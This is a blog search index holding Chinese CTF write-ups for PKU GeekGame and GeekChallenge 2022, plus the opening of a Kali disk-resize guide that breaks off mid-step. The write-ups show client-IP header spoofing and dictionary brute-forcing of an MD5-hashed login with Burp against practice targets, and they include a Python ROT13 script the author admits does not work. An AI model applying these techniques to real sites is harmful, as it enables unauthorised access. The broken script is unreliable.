<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PKU GeekGame WP</title>
      <link href="/posts/7d9fbcf479b6/"/>
      <url>/posts/7d9fbcf479b6/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>北大的题目还是比较新且有意思的~</li></ul><h1 id="Tutorial"><a href="#Tutorial" class="headerlink" title="Tutorial"></a>Tutorial</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>题目：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/15/0b5bc0651083ef63.png"></p><p>附件为一个限制编辑的pdf</p><blockquote><p>可以直接拖到谷歌里打开 ctrl+A 全选 ctrl+C 复制~</p></blockquote><p><img src="https://s3.bmp.ovh/imgs/2023/03/14/58ff51de01e40803.png"></p><p>直接粘贴 得到一个栅栏过的flag</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/14/40e03c638c7fbf23.png"></p><p>枚举得到</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/14/801e2637b962c98e.png"></p><p>flag：flag{Welcome_to_PKU_GeekGameV2!}</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="智慧检测器"><a href="#智慧检测器" class="headerlink" title="智慧检测器"></a>智慧检测器</h2><p>题目：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/15/dccb39e5cb9dd010.png"></p><h3 id="flag1：破坏者"><a href="#flag1：破坏者" class="headerlink" title="flag1：破坏者"></a>flag1：破坏者</h3><p>方法一：</p><ul><li>利用bug 直接走一步 +u 超过此层层数</li></ul><p>方法二：</p><ul><li>把自己不断放进边界 然后再走回出现自己的边界 就会使游戏出现bug</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/03/14/bcbdf3ea15ad3b86.png"></p><p>flag：flag{Game.exe-stOps-rESponding…send-error-report?}</p><h3 id="flag2：调停者"><a href="#flag2：调停者" class="headerlink" title="flag2：调停者"></a>flag2：调停者</h3><p><img src="https://s3.bmp.ovh/imgs/2023/03/14/d6ddf80e88326a30.png"></p><p>利用flag1的方法一的bug 👇👇</p><p>利用游戏只看第一个字母指令是否能执行  然后不管之后的指令直接执行</p><p>+d —— 可以直接看到终点在哪</p><p>+u —— 可以不断上一层 终点在79层</p><p>利用bug通关得到flag2</p><p>flag：flag{dear-plaYer-thanks-for-enjoying-ThiS-ubisofT-game}</p><h2 id="小北问答-·-极速版"><a href="#小北问答-·-极速版" class="headerlink" title="小北问答 · 极速版"></a>小北问答 · 极速版</h2><p>题目：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/15/7fa2d1516eafa546.png"></p><h3 id="flag1：及格摆烂"><a href="#flag1：及格摆烂" class="headerlink" title="flag1：及格摆烂"></a>flag1：及格摆烂</h3><p>社工题捏  剩下的要脚本交互不会就拿不到flag2</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/14/31101cb66ce5339d.png"></p><ul><li><p><strong>软件包名：</strong> 搜索得到</p></li><li><p><strong>firefox支持版本：</strong></p></li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/03/14/554d3ebf5d3e6078.png"></p><ul><li><strong>b站av号：</strong></li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/03/14/688db0ab67b3ba06.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;//player.bilibili.com/player.html?aid=418645518&amp;bvid=BV1EV411s7vu&amp;cid=354201191&amp;page=1&quot;</span> scrolling=<span class="string">&quot;no&quot;</span> border=<span class="string">&quot;0&quot;</span> frameborder=<span class="string">&quot;no&quot;</span> framespacing=<span class="string">&quot;0&quot;</span> allowfullscreen=<span class="string">&quot;true&quot;</span>&gt; &lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>aid即为av号</p><ul><li><strong>gShore OI号：</strong></li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/03/14/a5dbb99a76c943b4.png"></p><p>👇👇</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/14/b92bd3931754ec42.png"></p><p>👇👇</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/14/35aeb80d24bef3fb.png"></p><ul><li><strong>Host请求头值：</strong> 抓包</li></ul><p>flag：flag{i-am-The-KiNG-of-anxiety}</p><h2 id="Flag-Checker"><a href="#Flag-Checker" class="headerlink" title="Flag Checker"></a>Flag Checker</h2><p>题目：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/15/b34fff230b2cd5a7.png"></p><h3 id="flag1："><a href="#flag1：" class="headerlink" title="flag1："></a>flag1：</h3><p>用 jd-gui 反编译java程序</p><p>点击 save 将反编译代码保存</p><p>然后发现</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/14/758bbb19bd62ef52.png"></p><p>有被加密过的字符串</p><p>追溯 rot13</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/14/854bfd255e43d803.png"></p><p>很简单的加密</p><blockquote><p>但是我的脚本报错了呜呜呜 不会转成 ascii 码</p><p>不知道什么原因 先留个档~</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;MzkuM8gmZJ6jZJHgnaMuqy4lMKM4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">c = <span class="built_in">int</span>(c)</span><br><span class="line"><span class="keyword">if</span> (c &gt;= <span class="string">&#x27;a&#x27;</span> &amp; c &lt;= <span class="string">&#x27;m&#x27;</span>): </span><br><span class="line">c = c + <span class="number">13</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(c),end=<span class="string">&#x27;&#x27;</span>) </span><br><span class="line"><span class="keyword">elif</span> (c &gt;= <span class="string">&#x27;A&#x27;</span> &amp; c &lt;= <span class="string">&#x27;M&#x27;</span>): </span><br><span class="line">c = c + <span class="number">13</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(c),end=<span class="string">&#x27;&#x27;</span>) </span><br><span class="line"><span class="keyword">elif</span> (c &gt;= <span class="string">&#x27;n&#x27;</span> &amp; c &lt;= <span class="string">&#x27;z&#x27;</span>): </span><br><span class="line">c = c - <span class="number">13</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(c),end=<span class="string">&#x27;&#x27;</span>) </span><br><span class="line"><span class="keyword">elif</span> (c &gt;= <span class="string">&#x27;N&#x27;</span> &amp; c &lt;= <span class="string">&#x27;Z&#x27;</span>): </span><br><span class="line">c = c - <span class="number">13</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(c),end=<span class="string">&#x27;&#x27;</span>) </span><br><span class="line"><span class="keyword">elif</span> (c &gt;= <span class="string">&#x27;5&#x27;</span> &amp; c &lt;= <span class="string">&#x27;9&#x27;</span>): </span><br><span class="line">c = c - <span class="number">5</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(c),end=<span class="string">&#x27;&#x27;</span>) </span><br><span class="line"><span class="keyword">elif</span> (c &gt;= <span class="string">&#x27;0&#x27;</span> &amp; c &lt;= <span class="string">&#x27;4&#x27;</span>): </span><br><span class="line">c = c + <span class="number">5</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(c),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>只能用眼睛看出来了</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/14/37c76530412ee3b9.png"></p><p>看到了熟悉的 Zmxh开头 直接 base64 解码</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/14/78a887f0da9210f1.png"></p><p>flag：flag{s1mp1e-jvav_rev}</p><h3 id="flag2：-未解出……"><a href="#flag2：-未解出……" class="headerlink" title="flag2：  (未解出……"></a>flag2：  (未解出……</h3><p><img src="https://s3.bmp.ovh/imgs/2023/03/15/a2e8b38c487c1cac.png"></p><p>发现乱码</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/15/cc4140b836c94931.png"></p><p>转换一下</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/15/efe09a43df017530.png"></p><p>👇👇</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/15/6db2889be00eb785.png"></p><p>发现原来为unicode</p><p>并且为十六进制</p><p>直接替换掉 \u00 得到十六进制</p><ul><li>（或者）</li></ul><p>将乱码复制进 十六进制编辑器 以 unicode 形式显示</p><p>但这是已知是 unicode 才找到的方法 不好</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/15/8b6523a18eced86a.png"></p><hr><p><img src="https://s3.bmp.ovh/imgs/2023/03/15/5dda5aab7c6af7c7.png"></p><p><a href="https://www.23bei.com/tool/967.html">在线网站</a> 进行 EF 异或</p><p>打开 CyChef 转换十六进制出来一个 java脚本 整理得</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">functioncheckflag2(_0xa83ex2) &#123;</span><br><span class="line">var_0x724b = [<span class="string">&#x27;charCodeAt&#x27;</span>, <span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;stringify&#x27;</span>, <span class="string">&#x27;Correct&#x27;</span>, <span class="string">&#x27;Wrong&#x27;</span>, <span class="string">&#x27;j-&#x27;</span>];</span><br><span class="line"><span class="keyword">return</span> (JSON[_0x724b[<span class="number">4</span>]](_0xa83ex2[_0x724b[<span class="number">3</span>]](_0x724b[<span class="number">2</span>])[_0x724b[<span class="number">1</span>]](function(_0xa83ex3) &#123;</span><br><span class="line">return_0xa83ex3[_0x724b[<span class="number">0</span>]](<span class="number">0</span>)</span><br><span class="line">&#125;)) == JSON[_0x724b[<span class="number">4</span>]]([<span class="number">0</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">30</span>, <span class="number">105</span>, <span class="number">16</span>, <span class="number">31</span>, <span class="number">16</span>, <span class="number">67</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">5</span>, <span class="number">60</span>, <span class="number">4</span>, <span class="number">106</span>, <span class="number">6</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">67</span>, <span class="number">3</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">33</span>, <span class="number">232</span>][_0x724b[<span class="number">1</span>]](function(_0xa83ex3) &#123;</span><br><span class="line"><span class="keyword">return</span> (checkflag2 + _0x724b[<span class="number">2</span>])[_0x724b[<span class="number">0</span>]](_0xa83ex3)</span><br><span class="line">&#125;)) ? _0x724b[<span class="number">5</span>] : _0x724b[<span class="number">6</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>卡住…</p><h2 id="编原译理习题课"><a href="#编原译理习题课" class="headerlink" title="编原译理习题课"></a>编原译理习题课</h2><p>题目：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/15/7156c0d95ffc9b5d.png"></p><h3 id="flag2：玩挺长"><a href="#flag2：玩挺长" class="headerlink" title="flag2：玩挺长"></a>flag2：玩挺长</h3><p><a href="https://codegolf.stackexchange.com/questions/1956/generate-the-longest-error-message-in-c?answertab=createdasc#tab-top">参考网站：</a>  （勿尝试！后果自负！）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;<span class="function">T <span class="title">f</span><span class="params">(T a)</span></span>&#123;<span class="keyword">return</span> <span class="built_in">f</span>(std::<span class="built_in">set</span>&lt;T&gt;());&#125;<span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;<span class="built_in">f</span>(<span class="number">0</span>);&#125;</span><br></pre></td></tr></table></figure><p>（大佬们真的恐怖哈哈哈）</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/15/733d13258eb8e981.png"></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/15/2b0d2a1779d5f328.png"></p><p>flag：flag{short volatiLe program; long long meSSage;}</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Geekgame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GeekChallenge 2022 WP</title>
      <link href="/posts/b8d8a2a3cae9/"/>
      <url>/posts/b8d8a2a3cae9/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>Geekchallenge 的题都特别适合新手！</li></ul><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Can-Can-Need"><a href="#Can-Can-Need" class="headerlink" title="Can Can Need"></a>Can Can Need</h2><p><img src="https://s3.bmp.ovh/imgs/2023/03/10/3bc8d1b540b778c2.png"></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/10/4a54cb926512ed45.png"></p><p>尝试 xxf</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/10/e7a8809ed5c618fd.png"></p><p>被戏耍 查找 <a href="https://blog.csdn.net/cib439/article/details/122075428?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166749392516782395316202%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=166749392516782395316202&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-122075428-null-null.142%5Ev63%5Econtrol,201%5Ev3%5Econtrol,213%5Ev1%5Econtrol&utm_term=%E4%BC%AA%E9%80%A0%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7ctf&spm=1018.2226.3001.4187">相关资料</a></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/10/4645ac364638605e.png"></p><p>发现一般 xff 不行就用 client-ip （注意要重新刷新页面）</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/10/daaa25dc08ed7c2f.png"></p><p>👇👇👇</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/10/081a132b01b63b90.png"></p><p>👇👇👇</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/10/32ce2fdd23b4874d.png"></p><p>又难到我了 没见过 搜索类似题👇 —— <strong>用 From头</strong></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/10/011658a00d7a1d9a.png"></p><p>紧接着</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/10/27c71016d5883115.png"></p><blockquote><p>得到flag 还搜索到一些没提到的新知识  记录一下 👇</p></blockquote><p><img src="https://s3.bmp.ovh/imgs/2023/03/10/47b99cf61899c56e.png"></p><p>flag：SYC{E3sy_Http_hhXD2333}</p><h2 id="L0veSyc"><a href="#L0veSyc" class="headerlink" title="L0veSyc"></a>L0veSyc</h2><p><img src="https://s3.bmp.ovh/imgs/2023/03/10/a54b8d8ce96568b3.png"></p><p>查看网站源码搜索 SYC</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/10/0dfe245051d43555.png"></p><p>flag：SYC{Welc0me_t0_Geek 2022!}</p><h2 id="jsfind"><a href="#jsfind" class="headerlink" title="jsfind"></a>jsfind</h2><p><img src="https://s3.bmp.ovh/imgs/2023/03/10/6450c6759a7f7908.png"></p><p>打开容器是道游戏题 直接查看源代码</p><p>看看题目jsfind 看到开头的js文件直接点开</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/10/c39acabefb82836b.png"></p><p>发现含有flag字样的js</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/10/a29095456b33c8dc.png"></p><p>打开此js</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/3390bf27c42c9586.png"></p><p>发现base64 解码得到一段js代码</p><p>控制台输出得到flag</p><p>flag：SYC{D@y0u_LiKKe_D3code_EnCodE}</p><h2 id="登陆试试"><a href="#登陆试试" class="headerlink" title="登陆试试"></a>登陆试试</h2><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/1bb7f055c7c9ff61.png"></p><p>发现是密码爆破 直接先输入用户名和点击登录抓包</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/6c1f8052ba376b48.png"></p><p>一开始没注意密码那不是正常的整型数字  直接 774+字典爆破  发现没有结果</p><p>于是翻源代码</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/dfe11f7f6110bc52.png"></p><p>发现会将密码进行 MD5 加密后上传</p><p>搜索发现 bp 可以进行 MD5 加密爆破</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/83719f70e83df5b2.png"></p><p>接着进行字典制作（用手打太累了，练练用脚本~）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;774&#x27;</span><span class="string">&#x27;%03d&#x27;</span>%i)</span><br></pre></td></tr></table></figure><p>然后爆破</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/71eb2e8dd2719a90.png"></p><blockquote><p><em><strong>（还学了一种方法 —— 若长度相同，如何查找flag）</strong></em></p></blockquote><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/b08ee1e3afea87f7.png"></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/c02945e038e903dd.png"></p><p>flag：SYC{xi_huan_4_l}</p><h2 id="来发个包"><a href="#来发个包" class="headerlink" title="来发个包"></a>来发个包</h2><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/07023f5b190c9912.png"></p><p>先看看源代码</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/7a83e0718b804269.png"></p><blockquote><p>xhr.open()相当于打开一个通道</p><p>让你把信息post到flag.php</p><p>用’ifffflag&#x3D;’+uname;的形式</p><p>xhr.send()就是发送</p></blockquote><p>于是直接post ifffflag&#x3D;flag 到 flag.php</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/dbef039f16b30f59.png"></p><blockquote><p><em><strong>如果用 burp 抓包做，POST一定要用右键改请求方法，不要手动改成 POST</strong></em></p></blockquote><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/889096b2dd8a65fd.png"></p><p>flag：SYC{:D_y0u_has_known_how_to_construct_a_requests_by_yourself}</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="w-or-m"><a href="#w-or-m" class="headerlink" title="w_or_m?"></a>w_or_m?</h2><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/33efc9b32809006a.png"></p><p>谷歌搜索 zigzag cipher</p><p>搜索到国外 <a href="https://www.dcode.fr/rail-fence-cipher">z型密码解密网站</a></p><p>输入附件密文：0_cmdo1elfe_2_}WtoC!{0mr!C__7!YtepoS34</p><p>自动解密</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/18383e8306034e6f.png"></p><p>flag：SYC{welc0me_t0_t3e_mo2ld_of_Cr7p4o!!!}</p><h2 id="ez-classic"><a href="#ez-classic" class="headerlink" title="ez_classic"></a>ez_classic</h2><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/0fe89ce3cb72a22e.png"></p><p>简单的摩斯密码解密 <a href="http://tool.bugku.com/mosi/">摩斯密码在线加密解密 - Bugku</a> （注意分隔符改为空格）</p><p>附件密文：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.. .-.. .-. --- .-- --- - .--. -.-- .-. -.-. --- .-.. .-.. . ....</span><br></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/03/12/1da9071ade4bcbb0.png"></p><p>将解密出来的字符倒序得到flag</p><p>flag：SYC{HELLOCRYPTOWORLD}</p><h2 id="StarterRSA"><a href="#StarterRSA" class="headerlink" title="StarterRSA"></a>StarterRSA</h2><p><img src="https://s3.bmp.ovh/imgs/2023/03/12/74d59de57efd86fc.png"></p><p>附件：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/12/a392168d53029741.png"></p><p>分解n 得到p和q 之后就是简单的RSA解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p=733</span><br><span class="line">q=95477237049507309456995237633299455479842799122185033123721445158557275878211</span><br></pre></td></tr></table></figure><p>一个常规RSA解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">c = <span class="number">67672845063517415442486175096448664617581579564885311842326107871805595697454701</span></span><br><span class="line">n = <span class="number">69984814757288857831977509185208500866724771756561629279687819301222483218728663</span></span><br><span class="line"><span class="comment">#n = int(&quot;&quot;,16)</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="comment">#e = int(&quot;&quot;,16)</span></span><br><span class="line">p = <span class="number">733</span> </span><br><span class="line">q = <span class="number">95477237049507309456995237633299455479842799122185033123721445158557275878211</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n) <span class="comment"># m 的十进制形式</span></span><br><span class="line">string = long_to_bytes(m) <span class="comment"># m明文</span></span><br><span class="line"><span class="built_in">print</span>(string) <span class="comment"># 结果为 b‘ m ’ 的形式</span></span><br></pre></td></tr></table></figure><p>flag：SYC{5t4rt_R5A_ls_1t_3a5y?}</p><h2 id="Pairs"><a href="#Pairs" class="headerlink" title="Pairs"></a>Pairs</h2><p><img src="https://s3.bmp.ovh/imgs/2023/03/12/cffabcd4eda35b55.png"></p><p>谷歌搜索 twins of hex</p><p>发现解密网站 —— <a href="https://www.calcresult.com/misc/cyphers/twin-hex.html">双十六进制解密</a></p><p>输入密文：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3tl2nv2zl2zl2zl4pg6gh5tr2z76kf2nt5zc56a6w0</span><br></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/03/12/60d6492f5a8029db.png"></p><p>顺带发现了这个 <a href="https://www.calcresult.com/misc/cyphers/">有很多怪解密方式的网站</a></p><p>flag：SYC{HAHAHA_Tw1n_H3x_Cypher}</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="0-哪里有0-流口水"><a href="#0-哪里有0-流口水" class="headerlink" title="0?哪里有0[流口水]"></a>0?哪里有0[流口水]</h2><p><img src="https://s3.bmp.ovh/imgs/2023/03/12/440e64b0d7870fd8.png"></p><p>与题目0对应 零宽度字符 的隐写方式</p><p>参考  <a href="http://www.ga1axy.top/index.php/archives/20/">浅谈基于零宽度字符的隐写方式</a></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/12/f66f6833f84974af.png"></p><blockquote><p><em><strong>（记录需要记住的一个点：全选文本直接用 ctrl+A，不要直接手动选中，像此字符就不无法直接鼠标选中）</strong></em></p></blockquote><p>全选附件 进入 CyChef</p><p>进入 <a href="http://330k.github.io/misc_tools/unicode_steganography.html">零宽度字符解密网站</a></p><p>查看 CyberChef 下方 Output 进行网站中隐写形式选择</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/13/1ee2caa87a938ff2.png"></p><p>👇👇</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/12/1fcdfbc5769e3a89.png"></p><p>然后进行decode</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/13/3d466c77cf4e4dc0.png"></p><p>flag：SYC{sycl0ver_no_gaylabs}</p><h2 id="I-Got-Smoke"><a href="#I-Got-Smoke" class="headerlink" title="I Got Smoke"></a>I Got Smoke</h2><p><img src="https://s3.bmp.ovh/imgs/2023/03/12/ee8a61d32b707237.png"></p><p>将附件的mp3文件用 Audacity 打开</p><blockquote><p><strong>（按理来说应该先仔细听一遍）</strong></p></blockquote><p>观察波形无特别</p><p>右键打开频谱图</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/13/8915f2eeff729a42.png"></p><p>发现频谱图中藏有东西</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/12/2f681aefe42683e1.png"></p><p>（一开始以为bj3是某个工具）</p><p>使用 MP3stego 工具（教学：<a href="https://www.cnblogs.com/M3tar/p/7367932.html">音频隐写 MP3stego+wav隐写+题目</a> ）</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/12/35d4c151a3814e8f.png"></p><p>跟着来就行了</p><p>flag：SYC{ltc_v_1s_0nf1r3!!}</p><h2 id="超人不会飞"><a href="#超人不会飞" class="headerlink" title="超人不会飞"></a>超人不会飞</h2><p><img src="https://s3.bmp.ovh/imgs/2023/03/12/205ea871bfbe0031.png"></p><p>下载下来是一个压缩包</p><p>准备解压时发现显示文件头损坏</p><p>一开始以为是伪加密 但是解压没发现有密码 奇怪……</p><p>两张图片是可见的 但是flag.txt是空白的 不理解……</p><p>先用 Stegsolve 打开第一张图片</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/13/d879fb7a1db196b2.png"></p><p>感觉有倪端 直接 data extract 发现png文件头</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/12/0478fde746526709.png"></p><p>另存为png文件（记得加 .png 后缀）</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/12/82be75da30172801.png"></p><p>发现二维码  <a href="https://online-barcode-reader.inliteresearch.com/">在线网站读取二维码</a></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/13/0533eb9014db0c1b.png"></p><p>得到一半flag —— SYC{0f_c0urs3_Sup3</p><p>用 stegsovle 打开另一张图片 看了一会没啥头绪 直接 data extract</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/12/c35228c515e2d13f.png"></p><p>发现另一半flag</p><p>提交时将中间的一个空格删掉即可</p><p>flag：SYC{0f_c0urs3_Sup3rmAn_c4n_F1y}</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GeekChallenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于kali sda1爆满扩容</title>
      <link href="/posts/3469cd8dc23b/"/>
      <url>/posts/3469cd8dc23b/</url>
      
        <content type="html"><![CDATA[<h1 id="前言（起因"><a href="#前言（起因" class="headerlink" title="前言（起因"></a>前言（起因</h1><ul><li>一天感觉 kali 怪怪的  就查看了一下内存情况</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">df</span> -h</span><br></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/03/07/2e2745b54553d9af.png"></p><p>果不其然…   于是到处搜集资料一步一步进行 sda1 的扩容</p><h1 id="一、先进行磁盘的扩容"><a href="#一、先进行磁盘的扩容" class="headerlink" title="一、先进行磁盘的扩容"></a>一、先进行磁盘的扩容</h1><p><a href="https://blog.csdn.net/sunjikui1255326447/article/details/96430918">这部分参考</a></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/07/be236cce3b26c63b.png"></p><h1 id="二、唤起-gparted"><a href="#二、唤起-gparted" class="headerlink" title="二、唤起 gparted"></a>二、唤起 gparted</h1><p><a href="https://zhuanlan.zhihu.com/p/102203354">Gparted</a>   我 kali 的 gparted 是自带的还是以前下载的（？</p><p>没有就直接安装一下~</p><p>先用命令进入root模式 省的一直sudo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -i</span><br></pre></td></tr></table></figure><p>唤起工具 gparted</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gparted</span><br></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/03/07/e95c44ccf23b76a1.png"></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/07/62f6abe3561e77a0.png"></p><blockquote><p>（我这里存在未分配是因为我之前添加了空间但是没扩进去…）</p></blockquote><h1 id="三、删除-extended-和-swap-分区以便进行扩容"><a href="#三、删除-extended-和-swap-分区以便进行扩容" class="headerlink" title="三、删除 extended 和 swap 分区以便进行扩容"></a>三、删除 extended 和 swap 分区以便进行扩容</h1><p>先停用 swap 